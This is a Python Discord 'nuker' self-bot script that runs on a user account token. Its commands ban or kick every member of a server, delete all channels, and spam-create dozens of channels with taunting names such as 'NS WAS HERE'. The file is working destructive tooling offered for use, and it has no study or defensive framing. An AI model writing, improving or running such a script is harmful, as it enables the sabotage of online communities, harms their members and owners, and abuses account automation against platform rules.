import discord
import time
from discord.ext import commands
from colorama import Fore, init 
import requests
import os 
import random

prefix = "NS_"

NS = commands.Bot(command_prefix=prefix, self_bot=True)
NS.remove_command('help')

@NS.event
async def on_connect():
    print(f'''{Fore.RED}

 ███▄    █  █    ██  ██ ▄█▀▓█████            
 ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀            
▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███              
▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄            
▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒           
░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░           
░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░           
   ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░              
         ░    ░     ░  ░      ░  ░           
                                             
  ██████   █████   █    ██  ▄▄▄      ▓█████▄ 
▒██    ▒ ▒██▓  ██▒ ██  ▓██▒▒████▄    ▒██▀ ██▌
░ ▓██▄   ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ░██   █▌
  ▒   ██▒░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ░▓█▄   ▌
▒██████▒▒░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒░▒████▓ 
▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░ ▒▒▓  ▒ 
░ ░▒  ░ ░ ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░ ░ ▒  ▒ 
░  ░  ░     ░   ░  ░░░ ░ ░   ░   ▒    ░ ░  ░ 
      ░      ░       ░           ░  ░   ░    
                                      ░            
                                                               
          _ ._  _ , _ ._
        (_ ' ( `  )_  .__)           /\ 
      ( (  (    )   `)  ) _)        /  \ 
     (__ (_   (_ . _) _) ,__)       |  | 
         `~~`\ ' . /`~~`            |  | 
              ;   ;                / == \ 
              /   \                |/**\|     
_____________/_ __ \_____________
                                                                       
            {Fore.WHITE}[+] Made by 7tacey and Janky
              {Fore.WHITE}_________________    
                {Fore.WHITE}
                {Fore.WHITE}[-] Nuke
                  {Fore.WHITE}[-] BanALL
                    {Fore.WHITE}[-] KickALL
                     {Fore.WHITE}[-] Channels
                       {Fore.WHITE}[-] DelChannels
                                                                                               
                                                                               ''')
@NS.command()
async def help(ctx):
    embed = discord.Embed(title="NS👻💥 NUKER", color= discord.Color(random.randint(0x000000, 0xFFFFFF)))
    embed.set_thumbnail(url="https://thumbs.gfycat.com/TornMammothAmericangoldfinch-size_restricted.gif")
    embed.add_field(name=prefix+"**Nuke**", value="`Nukes The Server 👻💥`.\n", inline=False)
    embed.add_field(name=prefix+"**BanALL**", value="`Bans Everyone 👻💥`\n", inline=False)
    embed.add_field(name=prefix+"**KickALL**", value="`Kicks Everyone 👻💥`\n", inline=False)  
    embed.add_field(name=prefix+"**Channels**", value="`Spam Creates Channels 👻💥`\n", inline=False)
    embed.add_field(name=prefix+"**DelChannels**", value="`Deletes Channels 👻💥`\n", inline=False)
    embed.add_field(name=prefix+'⠀', value="**Made By Janky and 7tacey**", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://cdn.discordapp.com/attachments/725224238856011776/728733515801428028/Gif_39.gif")
    await ctx.send(embed=embed)

@NS.command()
async def nuke(ctx):
    await ctx.message.delete()
    print(f"{Fore.RED}Starting...")
    for users in ctx.guild.members:
        try:
            await users.ban()
            print(f"{Fore.WHITE}Banned")
        except:
            print(f"{Fore.RED}Failed To Ban")
            print(f"{Fore.WHITE}NS👻💥 WIZZED YOU")
    for channel in ctx.guild.channels:
            await channel.delete()
            print(f"{Fore.RED}Deleted {channel.name}")
    for i in range(1, 40):
            await ctx.guild.create_text_channel(name=f'NS👻💥 WAS HERE')
            print(f"{Fore.WHITE}Added {channel.name}")
  
@NS.command()
async def banALL(ctx):
  await ctx.message.delete()
  await ctx.send("`Banning Started`")
  print(f"{Fore.WHITE}Ban Starting...")
  for users in ctx.guild.members:
      try:
          await users.ban()
          print(f"{Fore.RED}Banned")
      except:
          print(f"{Fore.WHITE}Failed To be banned")

@NS.command()
async def kickALL(ctx):
  await ctx.message.delete()
  await ctx.send("`Kicking Started`")
  print(f"{Fore.WHITE}Ban Starting...")
  for users in ctx.guild.members:
      try:
          await users.kick()
          print(f"{Fore.RED}Banned")
      except:
          print(f"{Fore.WHITE}Failed To be banned")

@NS.command()
async def Channels(ctx):
  await ctx.message.delete()
  print(f"{Fore.RED} Deleting Channels...")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.WHITE}Creating Channels...")
  for i in range(100):
    await ctx.guild.create_text_channel(name=f'NS👻💥 FOR LIFE')
    print(f"{Fore.RED}Added {channel.name}")

@NS.command()
async def DelChannels(ctx):
  await ctx.message.delete()
  print(f"{Fore.WHITE}Deleting Channels")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.RED} Deleted Channels")

NS.run('Your Token Here', bot=False)